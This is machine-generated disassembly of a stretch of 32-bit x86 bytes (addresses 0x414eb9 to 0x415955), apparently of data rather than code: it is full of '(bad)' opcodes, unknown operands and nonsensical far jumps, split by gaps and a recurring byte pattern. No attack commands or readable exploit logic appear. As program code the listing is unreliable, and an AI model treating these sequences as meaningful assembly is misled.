  414eb9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ebb:	pushf  
  414ebc:	jecxz  0x414f24
  414ebe:	cdq    
  414ebf:	dec    edx
  414ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ec1:	mov    bh,0x95
  414ec3:	aam    0xb4
  414ec5:	int3   
  414ec6:	add    BYTE PTR [ebp+0x4a0b0a89],0x42
  414ecd:	shr    DWORD PTR fs:[esi-0x20],1
  414ed1:	mov    DWORD PTR [ecx],esp
  414ed3:	inc    ebx
  414ed4:	xor    eax,0x4f45c66f
  414ed9:	and    eax,0x8d657907
  414ede:	cmp    cl,ah
  414ee0:	sbb    DWORD PTR [edi+0x4a],esp
  414ee3:	xor    eax,esp
  414ee5:	or     BYTE PTR [edx],bh
  414ee7:	cdq    
  414ee8:	outs   dx,DWORD PTR ds:[esi]
  414ee9:	and    ecx,DWORD PTR [eax+0x1332823a]
  414eef:	dec    ebx
  414ef0:	mov    cs,WORD PTR [esp+ebx*2]
  414ef3:	mov    dh,0x35
  414ef5:	aas    
  414ef6:	ficomp WORD PTR [ebx]
  414ef8:	mov    BYTE PTR [ebp+0x16],dl
  414efb:	out    0xe7,al
  414efd:	mov    eax,DWORD PTR [ebx-0xeede013]
  414f03:	sub    dh,BYTE PTR [eax-0x60f4527b]
  414f09:	out    dx,eax
  414f0a:	sub    esp,DWORD PTR [edx]
  414f0c:	xor    DWORD PTR [esi+esi*2],edi
  414f0f:	aaa    
	...
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0xa9c42e88
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	push   ds
  414f8d:	(bad)  
  414f8e:	xlat   BYTE PTR ds:[ebx]
  414f8f:	pop    eax
  414f90:	scas   eax,DWORD PTR es:[edi]
  414f91:	test   BYTE PTR [ebx-0x1758eaec],dl
  414f97:	add    al,0xe8
  414f99:	dec    edi
  414f9a:	popa   
  414f9b:	jne    0x414f2d
  414f9d:	sub    BYTE PTR [eax+0x74],ah
  414fa0:	hlt    
  414fa1:	ror    DWORD PTR [eax],cl
  414fa3:	loop   0x414f8e
  414fa5:	mov    al,0xc
  414fa7:	inc    eax
  414fa8:	xchg   ecx,eax
  414fa9:	push   0x3c94a689
  414fae:	add    BYTE PTR [ecx+0x7d9b80d8],dl
  414fb4:	jle    0x414fca
  414fb6:	nop
  414fb7:	inc    ebx
  414fb8:	rcr    DWORD PTR [ebx+0x1500ebed],0xf9
  414fbf:	(bad)  
  414fc0:	ficomp DWORD PTR [ebx+0x48]
  414fc3:	cmp    eax,0xc7e0ef12
  414fc8:	adc    eax,0xd4a79f78
  414fcd:	mov    al,0xb8
  414fcf:	mov    al,0x7
  414fd1:	mov    esp,0xf0678502
  414fd6:	(bad)  
  414fd7:	stos   DWORD PTR es:[edi],eax
  414fd8:	sub    DWORD PTR [esi],ebx
  414fda:	int    0x81
  414fdc:	jge    0x414f67
  414fde:	stos   DWORD PTR es:[edi],eax
  414fdf:	jge    0x415005
  414fe1:	js     0x414fb5
  414fe3:	xor    ch,BYTE PTR [ebx-0x6991d7af]
  414fe9:	dec    ebp
  414fea:	add    BYTE PTR [esi],0xe1
  414fed:	jecxz  0x415057
  414fef:	test   al,0x88
  414ff1:	mov    esp,0x7e88d3f7
  414ff6:	fild   DWORD PTR [esi+0x4e]
  414ff9:	mov    edi,0x350aeb0b
  414ffe:	clc    
  414fff:	pop    ecx
  415000:	aaa    
  415001:	retf   
  415002:	xchg   ebx,eax
  415003:	dec    ecx
  415004:	jecxz  0x414fa3
  415006:	ret    0x5d43
  415009:	sbb    eax,0x69384e8b
  41500e:	ret    
  41500f:	sub    al,0x72
  415011:	jg     0x414fb1
  415013:	outs   dx,DWORD PTR ds:[esi]
  415014:	mov    esp,0xfa953188
  415019:	ror    BYTE PTR [edx-0x4d7e806f],0xa7
  415020:	push   ebx
  415021:	push   es
  415022:	sub    eax,0x85b4522f
  415027:	xor    al,0xad
  415029:	daa    
  41502a:	(bad)  [edx]
  41502c:	sbb    DWORD PTR [ebp+0xf00d26b],ebx
  415032:	and    al,0xa8
  415034:	push   edx
  415035:	ret    
  415036:	mov    ebp,ebp
  415038:	xchg   edi,eax
  415039:	push   ecx
  41503a:	ficomp DWORD PTR [esi]
  41503c:	cs pop esi
  41503e:	pop    ebx
  41503f:	mov    bl,0x2e
  415041:	push   ecx
  415042:	ret    0xa56d
  415045:	adc    edx,DWORD PTR [ecx+0x4658864c]
  41504b:	jg     0x41503c
  41504d:	mov    ebp,0xa3a11786
  415052:	nop
  415053:	jae    0x415085
  415055:	xor    ebp,DWORD PTR [edi+0x50]
  415058:	adc    ebx,DWORD PTR [edi+ecx*2+0x5c]
  41505c:	mov    WORD PTR [ebx],gs
  41505e:	mov    bh,0x4b
  415060:	push   ebp
  415061:	mov    esp,0xf2fb64ab
  415066:	outs   dx,BYTE PTR ds:[esi]
  415067:	call   0x65dab817
  41506c:	mov    cl,0x6e
  41506e:	jnp    0x41503e
  415070:	sbb    al,ch
  415072:	sub    eax,eax
  415074:	int    0x63
  415076:	push   esi
  415077:	mul    DWORD PTR [ebp+0x5d]
  41507a:	mov    DWORD PTR [ecx-0x4f],ebx
  41507d:	stos   BYTE PTR es:[edi],al
  41507e:	or     DWORD PTR [esi-0x4bf4aa7f],edi
  415084:	sub    DWORD PTR [ebx-0x51a30299],0x7d
  41508b:	hlt    
  41508c:	popa   
  41508d:	repnz iret 
  41508f:	inc    eax
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xc0cffc2d
  415102:	fcom   QWORD PTR [esp+ecx*1-0x22]
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	adc    BYTE PTR [ebx+edi*4+0x53],dh
  415110:	xor    al,0x56
  415112:	ror    DWORD PTR [ecx+0x43],cl
  415115:	out    dx,al
  415116:	std    
  415117:	fimul  WORD PTR [ecx]
  415119:	pop    edi
  41511a:	pop    DWORD PTR [edi-0x3fd56b4e]
  415120:	enter  0xf504,0x9a
  415124:	(bad)  
  415125:	xchg   edx,eax
  415126:	loope  0x4150bc
  415128:	mov    eax,0x5dc547d
  41512d:	mov    edi,0x145aab94
  415132:	xchg   ebx,eax
  415133:	or     esi,0xffd8a8a7
  415139:	and    al,0xa5
  41513b:	jno    0x415109
  41513d:	dec    edx
  41513e:	(bad)  
  41513f:	ds pop esp
  415141:	gs add eax,0xfebf84b4
  415147:	push   0xffffffca
  415149:	mov    edx,0xa515fa1a
  41514e:	aad    0xc4
  415150:	mov    ebp,DWORD PTR [esi]
  415152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415153:	jne    0x41512e
  415155:	stos   DWORD PTR es:[edi],eax
  415156:	add    DWORD PTR [eax],esi
  415158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415159:	push   0x60
  41515b:	mov    ebp,DWORD PTR [edx-0x28]
  41515e:	repz pop ebp
  415160:	cmp    ebx,DWORD PTR [edi+0x7d2db8d1]
  415166:	call   0x1e95:0xa2ff6280
  41516d:	nop
  41516e:	out    dx,eax
  41516f:	retf   
  415170:	push   ebp
  415171:	imul   ecx,DWORD PTR [edi+eiz*2-0x61],0x6d
  415176:	fld    QWORD PTR [ebp+0x61681cde]
  41517c:	cmc    
  41517d:	add    cl,dl
  41517f:	hlt    
  415180:	dec    esp
  415181:	jo     0x4151e9
  415183:	jne    0x4151b9
  415185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415186:	cmp    ch,BYTE PTR [ebx-0x1efb2693]
  41518c:	neg    DWORD PTR [edx-0x32]
  41518f:	test   eax,0x9859a553
  415194:	in     eax,0x6c
  415196:	push   edi
  415197:	jp     0x41512d
  415199:	cmp    dl,BYTE PTR [eax+0x224531bf]
  41519f:	mov    WORD PTR [ebx],fs
  4151a1:	jle    0x415149
  4151a3:	int    0xb2
  4151a5:	cli    
  4151a6:	(bad)  
  4151a7:	mov    bh,0x3d
  4151a9:	inc    ecx
  4151aa:	leave  
  4151ab:	dec    ecx
  4151ac:	adc    BYTE PTR [edi-0x7c],0xdf
  4151b0:	mov    ds:0xf70bc84d,eax
  4151b5:	mov    bh,0xbc
  4151b7:	jp     0x415179
  4151b9:	fnsave [esi+0x578d31aa]
  4151bf:	inc    ecx
  4151c0:	mov    ds:0x439723be,al
  4151c5:	ret    0xe441
  4151c8:	ja     0x415174
  4151ca:	sub    al,0xdb
  4151cc:	nop
  4151cd:	test   eax,0x79852ac2
  4151d2:	jg     0x41518c
  4151d4:	xchg   esp,eax
  4151d5:	sub    al,0x1
  4151d7:	ret    0xbc2e
  4151da:	stos   BYTE PTR es:[edi],al
  4151db:	pusha  
  4151dc:	pop    esp
  4151dd:	cmp    BYTE PTR [ebx],0x35
  4151e0:	pop    ebp
  4151e1:	sub    dh,dh
  4151e3:	xor    eax,0x2b184c74
  4151e8:	js     0x41525a
  4151ea:	sbb    eax,0xbe9d20c4
  4151ef:	add    DWORD PTR cs:[esi],edi
  4151f2:	jmp    0xa44:0xae5e9f1b
  4151f9:	out    0xbc,eax
  4151fb:	adc    edx,esi
  4151fd:	dec    ecx
  4151fe:	pop    ecx
  4151ff:	das    
  415200:	xchg   esi,eax
  415201:	xchg   esi,eax
  415202:	xchg   esi,eax
  415203:	repz xchg ecx,eax
  415205:	sub    eax,0x59675b22
  41520a:	retf   0x8b39
  41520d:	nop    DWORD PTR [ecx+0x0]
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xec740b0b
  415283:	mov    al,ds:0xdf10
  415288:	add    al,0x1
  41528a:	add    BYTE PTR [eax],al
  41528c:	pop    eax
  41528d:	out    dx,al
  41528e:	mov    esp,0xecf419df
  415293:	pop    edx
  415294:	mov    ebx,0xa9a92699
  415299:	xor    eax,0xd04d6020
  41529e:	mov    al,ds:0xd32e12ff
  4152a3:	mov    edi,DWORD PTR [eax+0x5a]
  4152a6:	mov    ds,WORD PTR [ecx+ebx*1]
  4152a9:	pop    esi
  4152aa:	icebp  
  4152ab:	stos   DWORD PTR es:[edi],eax
  4152ac:	mov    ch,BYTE PTR [esi+0xe3fbff8]
  4152b2:	xchg   edi,eax
  4152b3:	(bad)  
  4152b4:	lock lods eax,DWORD PTR ds:[esi]
  4152b6:	pop    ecx
  4152b7:	jb     0x415246
  4152b9:	fwait
  4152ba:	pop    ds
  4152bb:	jge    0x4152d9
  4152bd:	cwde   
  4152be:	xchg   BYTE PTR gs:[ebx-0x99fab3],ah
  4152c5:	cdq    
  4152c6:	xor    ch,bh
  4152c8:	stos   BYTE PTR es:[edi],al
  4152c9:	ss out dx,eax
  4152cb:	jp     0x415331
  4152cd:	shr    BYTE PTR [esi-0x2ffc7ff],1
  4152d3:	in     eax,0xd2
  4152d5:	add    ebx,DWORD PTR [edx+edx*8]
  4152d8:	adc    al,BYTE PTR [eax]
  4152da:	inc    ecx
  4152db:	dec    edx
  4152dc:	fcomp  st(0)
  4152de:	cmc    
  4152df:	lahf   
  4152e0:	test   DWORD PTR [edi-0x3f],0xebf747f7
  4152e7:	sub    al,0x4
  4152e9:	je     0x4152cd
  4152eb:	mov    al,0x8b
  4152ed:	and    al,0x7b
  4152ef:	mov    eax,0x68830072
  4152f4:	out    0x53,al
  4152f6:	jg     0x4152e2
  4152f8:	cli    
  4152f9:	lods   eax,DWORD PTR ds:[esi]
  4152fa:	push   esi
  4152fb:	lea    esi,[edi+0x14]
  4152fe:	sub    DWORD PTR [esi],ebx
  415300:	add    BYTE PTR [ebp-0x697fa2ec],al
  415306:	or     DWORD PTR [ecx+0x51acc69d],ecx
  41530c:	and    DWORD PTR [esi],edi
  41530e:	fcomp  QWORD PTR [edi-0x6]
  415311:	sbb    ebx,DWORD PTR [esi]
  415313:	in     al,0x5c
  415315:	aam    0x17
  415317:	inc    edx
  415318:	dec    edi
  415319:	add    BYTE PTR [eax-0x7e],0x95
  41531d:	out    0x6f,eax
  41531f:	fbld   TBYTE PTR [esi]
  415321:	cld    
  415322:	mov    esi,0x8f8835f8
  415327:	rcl    BYTE PTR [ecx+0x50734946],cl
  41532d:	pop    edi
  41532e:	xor    bh,BYTE PTR [edi]
  415330:	(bad)  
  415331:	cld    
  415332:	outs   dx,BYTE PTR ds:[esi]
  415333:	inc    edx
  415334:	xchg   ebp,eax
  415335:	pushf  
  415336:	mov    edx,0xf7167e15
  41533b:	add    DWORD PTR [esi-0x52d78c60],eax
  415341:	xor    ch,0x5c
  415344:	mov    esi,0x3283ab58
  415349:	loopne 0x4152e2
  41534b:	push   esp
  41534c:	fs stos BYTE PTR es:[edi],al
  41534e:	repnz sbb edx,DWORD PTR [esi+0x2c]
  415352:	adc    BYTE PTR [ecx-0x5dc85cbc],ah
  415358:	addr16 call 0xf3db9f1
  41535e:	lock inc edi
  415360:	cmc    
  415361:	mov    ah,0x19
  415363:	(bad)  
  415364:	sti    
  415365:	aad    0xa6
  415367:	dec    eax
  415368:	dec    edi
  415369:	rcr    BYTE PTR [ebx-0x4076329c],0x1e
  415370:	in     al,0xf1
  415372:	add    BYTE PTR [edi-0xa79059d],dh
  415378:	fild   DWORD PTR [edx]
  41537a:	out    0xa0,eax
  41537c:	or     al,0xaa
  41537e:	fst    QWORD PTR [ecx+0x39]
  415381:	ret    0xbf69
  415384:	scas   al,BYTE PTR es:[edi]
  415385:	test   al,0x2d
  415387:	push   fs
  415389:	push   cs
  41538a:	shr    BYTE PTR [ebx],1
  41538c:	(bad)  
  41538d:	lock and al,0xda
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xe0d3e5b0
  415401:	push   0xe01427c6
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	pop    esp
  41540d:	xor    BYTE PTR [esi+0x5f],cl
  415410:	adc    ecx,DWORD PTR [eax+0x75763a2b]
  415416:	mov    dl,0x2e
  415418:	or     al,0xe7
  41541a:	ja     0x4153a3
  41541c:	sub    eax,0xc0803a13
  415421:	gs mov dl,0xa7
  415424:	ja     0x41540e
  415426:	int3   
  415427:	push   esi
  415428:	mov    WORD PTR [ecx-0x3eef58b6],es
  41542e:	(bad)  
  41542f:	cmp    edi,DWORD PTR [eax]
  415431:	mov    esp,edi
  415433:	xchg   ebx,eax
  415434:	dec    ebp
  415435:	jmp    0x415468
  415437:	stos   DWORD PTR es:[edi],eax
  415438:	push   ds
  415439:	cmc    
  41543a:	mov    dh,BYTE PTR [ebp+0x3e]
  41543d:	pop    ebx
  41543e:	pop    ebp
  41543f:	mov    fs,esp
  415441:	fnsave [edi+0x62d3511]
  415447:	rcl    DWORD PTR [edi],1
  415449:	int    0x46
  41544b:	sub    eax,0xb1e18150
  415450:	cmp    BYTE PTR [ebx+0x3e],0xdf
  415454:	add    al,0x82
  415456:	aad    0x18
  415458:	mov    cl,0x47
  41545a:	pop    esp
  41545b:	pop    esi
  41545c:	or     DWORD PTR [edi+0x38d21c2d],0xffffffc5
  415463:	pop    edi
  415464:	pop    esi
  415465:	dec    ebx
  415466:	jmp    0x415428
  415468:	in     eax,dx
  415469:	dec    ebp
  41546a:	mov    cl,0xc3
  41546c:	mov    dh,0xaa
  41546e:	push   esi
  41546f:	lock cmp BYTE PTR [edi+0x5a],ah
  415473:	or     eax,0x6869fee9
  415478:	cmp    DWORD PTR ds:0x7302dfb,0x50
  41547f:	dec    edi
  415480:	popf   
  415481:	mov    ecx,DWORD PTR [esi-0x63]
  415484:	aam    0x93
  415486:	mov    BYTE PTR [ebp-0x64],dh
  415489:	pop    edi
  41548a:	mov    al,0xbc
  41548c:	shl    bh,cl
  41548e:	in     eax,dx
  41548f:	jmp    FWORD PTR [ebx]
  415491:	dec    eax
  415492:	(bad)  
  415494:	jecxz  0x41550d
  415496:	xor    eax,0x5066f4fc
  41549b:	in     eax,0xe2
  41549d:	js     0x4154f4
  41549f:	lods   al,BYTE PTR ds:[esi]
  4154a0:	fstp   QWORD PTR [ebx]
  4154a2:	sub    BYTE PTR [ebx],cl
  4154a4:	test   eax,0xee3cc8d0
  4154a9:	retf   
  4154aa:	mov    ebx,0xf04f5c4b
  4154af:	adc    DWORD PTR [edx+0x4b],ebp
  4154b2:	push   ebx
  4154b3:	das    
  4154b4:	hlt    
  4154b5:	cs retf 
  4154b7:	and    ebp,DWORD PTR [esi+0x69]
  4154ba:	inc    ebp
  4154bb:	aam    0xc
  4154bd:	cdq    
  4154be:	dec    ecx
  4154bf:	ror    BYTE PTR [edx+0x7564d00b],0x57
  4154c6:	lea    eax,[ebx+ecx*8+0x73]
  4154ca:	xchg   ecx,eax
  4154cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154cc:	das    
  4154cd:	rol    ebp,0xfe
  4154d0:	outs   dx,DWORD PTR ds:[esi]
  4154d1:	aam    0xb3
  4154d3:	adc    al,0x19
  4154d5:	sub    ah,BYTE PTR [edi+0x65f8b41d]
  4154db:	add    BYTE PTR [esi-0x23cdbee8],bh
  4154e1:	fldcw  WORD PTR [edi+0x2f]
  4154e4:	jmp    0x7274:0x237f71d9
  4154eb:	sbb    eax,DWORD PTR es:[eax+0x215b4044]
  4154f2:	xlat   BYTE PTR ds:[ebx]
  4154f3:	ret    0x4955
  4154f6:	sbb    ah,BYTE PTR fs:[eax+0x27]
  4154fa:	test   eax,0x70dffe6c
  4154ff:	lds    edx,FWORD PTR [edx+0x29a79757]
  415505:	cmp    bl,BYTE PTR [ecx+0x7039c5a0]
  41550b:	pushf  
  41550c:	into   
  41550d:	in     al,dx
  41550e:	stc    
  41550f:	call   0x415514
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415588
  415581:	mov    eax,0xe1188419
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	xchg   ebx,eax
  41558d:	enter  0xe43,0x45
  415591:	push   ebp
  415592:	xchg   edx,eax
  415593:	popf   
  415594:	fs loopne 0x41559f
  415597:	jmp    0x7588d8cb
  41559c:	sbb    al,cl
  41559e:	jge    0x41561e
  4155a0:	int3   
  4155a1:	je     0x4155a2
  4155a3:	mov    ?,ebp
  4155a5:	mov    ebx,0xd542d04e
  4155aa:	shl    DWORD PTR [edx+0xb],0x54
  4155ae:	retf   0x8164
  4155b1:	js     0x4155f9
  4155b3:	jno    0x4155f1
  4155b5:	sub    ebx,esi
  4155b7:	inc    esp
  4155b8:	pop    ecx
  4155b9:	rcr    BYTE PTR [ebx],cl
  4155bb:	xchg   BYTE PTR [ebx+ecx*8+0x48897ca3],dl
  4155c2:	push   esi
  4155c3:	clc    
  4155c4:	sti    
  4155c5:	xchg   ebx,eax
  4155c6:	mov    edx,0x65fdf966
  4155cb:	mov    ch,0x6e
  4155cd:	rcr    DWORD PTR [ebx+0x0],cl
  4155d0:	mov    esp,0x82502250
  4155d5:	les    esi,FWORD PTR [edi+0x5a13f8e]
  4155db:	add    al,0xa6
  4155dd:	pop    es
  4155de:	sub    DWORD PTR [esi],eax
  4155e0:	jbe    0x41556c
  4155e2:	aam    0xab
  4155e4:	jns    0x8b197239
  4155ea:	movd   DWORD PTR [ecx-0x1a1166d0],mm3
  4155f1:	js     0x415642
  4155f3:	xor    eax,DWORD PTR [eax+ebp*8-0x37]
  4155f7:	out    dx,al
  4155f8:	jne    0x41557f
  4155fa:	pusha  
  4155fb:	aad    0xa0
  4155fd:	mov    cl,0xfa
  4155ff:	adc    bh,BYTE PTR [ecx]
  415601:	jl     0x4155f0
  415603:	jl     0x41564d
  415605:	adc    cl,ch
  415607:	adc    BYTE PTR [esi+0x7fbe2ed7],al
  41560d:	ficomp WORD PTR [edi+edi*1]
  415610:	sbb    DWORD PTR [ebp+0x60815870],0x56
  415617:	xor    dl,ch
  415619:	pop    ebx
  41561a:	rcl    BYTE PTR [ebx],1
  41561c:	inc    eax
  41561d:	jmp    0x415603
  41561f:	xchg   ebp,eax
  415620:	cmp    al,0x5e
  415622:	sbb    DWORD PTR [edx+ecx*1+0x43faf562],edx
  415629:	cdq    
  41562a:	sbb    DWORD PTR [edi-0x6622a9f8],0x5710a485
  415634:	pop    ss
  415635:	push   edx
  415636:	sbb    al,0xf1
  415638:	xchg   esi,eax
  415639:	jae    0x415697
  41563b:	inc    eax
  41563c:	and    DWORD PTR [edx-0x79],eax
  41563f:	sub    BYTE PTR [ecx+ecx*8-0x34],cl
  415643:	cmp    BYTE PTR [ebp-0x55],ah
  415646:	sti    
  415647:	add    eax,0xfd44a41
  41564c:	mov    ds:0x84a95519,al
  415651:	mov    es,WORD PTR [edi]
  415653:	sub    al,0xe
  415655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415656:	or     eax,0x4a9a078f
  41565b:	adc    al,0x50
  41565d:	das    
  41565e:	pop    ss
  41565f:	mov    ds,esi
  415661:	aas    
  415662:	xor    cl,BYTE PTR [eax+eiz*4]
  415665:	mov    ah,BYTE PTR [edx-0x4785e720]
  41566b:	sub    al,0x62
  41566d:	out    0x9d,al
  41566f:	daa    
  415670:	mov    edi,0xd6d37e7a
  415675:	or     BYTE PTR [eax+esi*1-0x26],ch
  415679:	ret    0x96b5
  41567c:	push   ds
  41567d:	retf   
  41567e:	mov    cs,WORD PTR [edx]
  415680:	xchg   esp,eax
  415681:	push   0xfffffff2
  415683:	imul   BYTE PTR [eiz*8-0x192e39f3]
  41568a:	or     al,0xc4
  41568c:	sahf   
  41568d:	scas   al,BYTE PTR es:[edi]
  41568e:	inc    edx
  41568f:	repz add BYTE PTR [eax],al
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x4d
  415701:	pop    esi
  415702:	mov    dh,0x9f
  415704:	sbb    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	xor    BYTE PTR [ecx],dl
  41570e:	and    eax,0x40c559c5
  415713:	push   ebp
  415714:	mov    bh,0xfd
  415716:	jle    0x4156dc
  415718:	pop    ds
  415719:	loope  0x41571f
  41571b:	cmp    al,0x57
  41571d:	xchg   esp,eax
  41571e:	dec    esi
  41571f:	fcomp  st(6)
  415721:	sub    bh,bl
  415723:	mov    esi,0xd5e647e8
  415728:	ret    0x7f5e
  41572b:	shl    BYTE PTR [edx+esi*1-0x89ed6d6],cl
  415732:	lock mov DWORD PTR [esi-0x3a5749db],0xb099ae0d
  41573d:	mov    edx,edi
  41573f:	clc    
  415740:	gs int3 
  415742:	sub    al,0x79
  415744:	add    eax,0x9de26531
  415749:	ss inc ebp
  41574b:	icebp  
  41574c:	retf   0x7ce4
  41574f:	sahf   
  415750:	ret    0xcd90
  415753:	mov    al,0xcd
  415755:	cmp    al,0xf1
  415757:	stos   DWORD PTR es:[edi],eax
  415758:	stos   BYTE PTR es:[edi],al
  415759:	or     esi,eax
  41575b:	cmc    
  41575c:	and    DWORD PTR [ebp+0x4439193e],esp
  415762:	fld    DWORD PTR [eax-0x71]
  415765:	icebp  
  415766:	mov    eax,ds:0x675abac1
  41576b:	scas   al,BYTE PTR es:[edi]
  41576c:	retf   
  41576d:	jne    0x41570e
  41576f:	dec    ecx
  415770:	nop
  415771:	retf   
  415772:	push   ecx
  415773:	and    eax,0x436ceb55
  415778:	inc    esp
  415779:	sub    BYTE PTR [ecx+eax*1],dl
  41577c:	cmp    al,0x72
  41577e:	shl    BYTE PTR [ecx-0x20979e49],0xb2
  415785:	mov    bl,0x7f
  415787:	retf   0x8c5
  41578a:	fdivp  st(0),st
  41578c:	fcomp  DWORD PTR [edx]
  41578e:	push   esp
  41578f:	fimul  WORD PTR [ecx+0x43]
  415792:	add    DWORD PTR [esp+ecx*1-0x29],ebx
  415796:	cdq    
  415797:	js     0x415778
  415799:	into   
  41579a:	(bad)  
  41579c:	aaa    
  41579d:	imul   edi,DWORD PTR [edx],0x38
  4157a0:	lods   al,BYTE PTR ds:[esi]
  4157a1:	aas    
  4157a2:	dec    eax
  4157a3:	mov    al,ds:0x6e26d46f
  4157a8:	xchg   esi,eax
  4157a9:	(bad)  
  4157aa:	(bad)  
  4157ae:	mov    WORD PTR [esi],?
  4157b0:	add    ebx,DWORD PTR [ecx-0x5b44175]
  4157b6:	jnp    0x415825
  4157b8:	add    ebx,DWORD PTR [esi+0xf]
  4157bb:	xor    ch,bl
  4157bd:	mov    dh,BYTE PTR [ecx-0x32]
  4157c0:	adc    eax,0x5fbc22f
  4157c5:	jl     0x415765
  4157c7:	jns    0x4157f8
  4157c9:	push   ds
  4157ca:	std    
  4157cb:	jmp    FWORD PTR [ebp-0x56b0c156]
  4157d1:	pop    es
  4157d2:	xor    ecx,DWORD PTR [edx+0x38d5a81a]
  4157d8:	mov    dl,dh
  4157da:	adc    ebp,DWORD PTR [esi+0x17]
  4157dd:	xor    eax,0xb9a8529b
  4157e2:	xchg   edi,eax
  4157e3:	in     al,0x6f
  4157e5:	sbb    eax,0xd0bcb8fe
  4157ea:	mov    edi,fs
  4157ec:	xchg   ah,bl
  4157ee:	push   0xffffffee
  4157f0:	mov    ch,0xe0
  4157f2:	stos   BYTE PTR es:[edi],al
  4157f3:	pop    es
  4157f4:	jne    0x41582d
  4157f6:	cmp    eax,0xa991d522
  4157fb:	mov    eax,ds:0x1796f261
  415800:	iret   
  415801:	test   cl,0x6
  415804:	push   edi
  415805:	dec    eax
  415806:	push   esp
  415807:	test   al,0x83
  415809:	jmp    DWORD PTR [esi-0x31]
  41580c:	jb     0x41580a
  41580e:	xchg   BYTE PTR [eax+0x0],dl
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shl    DWORD PTR [edx+0x13],cl
  415882:	push   edi
  415883:	shl    BYTE PTR [eax],0xe3
  415886:	add    BYTE PTR [eax],al
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	dec    eax
  41588d:	retf   0xe8a3
  415890:	fsubr  QWORD PTR [ecx+0x23]
  415893:	sub    eax,0xa76a910d
  415898:	pop    edx
  415899:	sbb    DWORD PTR [edi-0xee00a68],esp
  41589f:	jle    0x41584b
  4158a1:	or     DWORD PTR [edx],eax
  4158a3:	pop    ebp
  4158a4:	fwait
  4158a5:	test   BYTE PTR [ebx+0x37],ah
  4158a8:	out    0xfe,al
  4158aa:	or     cl,BYTE PTR es:[edx+0x4a968490]
  4158b1:	mov    cl,0x37
  4158b3:	jne    0x41590d
  4158b5:	xchg   ah,ah
  4158b7:	test   dh,ch
  4158b9:	push   ds
  4158ba:	inc    eax
  4158bb:	xlat   BYTE PTR ds:[ebx]
  4158bc:	adc    al,0x29
  4158be:	and    DWORD PTR [eax*2-0xf92615c],esp
  4158c5:	retf   0x1651
  4158c8:	jecxz  0x4158a4
  4158ca:	cli    
  4158cb:	int3   
  4158cc:	jb     0x4158ea
  4158ce:	inc    esi
  4158cf:	or     eax,0x7943d9c5
  4158d4:	mov    eax,ds:0x7a6aa447
  4158d9:	outs   dx,BYTE PTR ds:[esi]
  4158da:	pop    edi
  4158db:	imul   ebx,DWORD PTR [esp+ebp*8+0x1ca38ccd],0xffffff9c
  4158e3:	jnp    0x4158e2
  4158e5:	pop    esi
  4158e6:	ret    0x45f8
  4158e9:	in     al,0x46
  4158eb:	(bad)  
  4158ec:	loope  0x415908
  4158ee:	jne    0x4158ad
  4158f0:	jno    0x415901
  4158f2:	fcom   DWORD PTR [ecx]
  4158f4:	add    ah,BYTE PTR [ebp+0x32]
  4158f7:	std    
  4158f8:	jp     0x4158dc
  4158fa:	jp     0x4158cc
  4158fc:	fldenv ds:0xb11825b0
  415902:	pop    eax
  415903:	ror    dh,cl
  415905:	ret    0x9983
  415908:	jle    0x4158fd
  41590a:	jnp    0x4158d9
  41590c:	cmp    ch,BYTE PTR [esi+0x3d3bffe1]
  415912:	mov    gs:0x63822e4b,eax
  415918:	xchg   edi,eax
  415919:	dec    edx
  41591a:	add    edi,DWORD PTR [edi+0x70a043df]
  415920:	pop    edi
  415921:	fcomp  st(7)
  415923:	dec    esp
  415924:	add    DWORD PTR [ebp+0x16c85cba],ebp
  41592a:	add    bl,dh
  41592c:	inc    esp
  41592d:	test   DWORD PTR cs:[si+0x4e63],esp
  415933:	sbb    BYTE PTR [eax+0x10acc209],cl
  415939:	out    0xb2,eax
  41593b:	stos   DWORD PTR es:[edi],eax
  41593c:	xchg   DWORD PTR [edx],esp
  41593e:	je     0x4158c1
  415940:	inc    ebx
  415941:	scas   eax,DWORD PTR es:[edi]
  415942:	gs xor al,0x3e
  415945:	mov    WORD PTR [eax+0x9d3ddd3],fs
  41594b:	sub    al,0xd5
  41594d:	jnp    0x4159a2
  41594f:	cmp    eax,DWORD PTR [edx+0x6dee0498]
  415955:	jp     0x4159ac
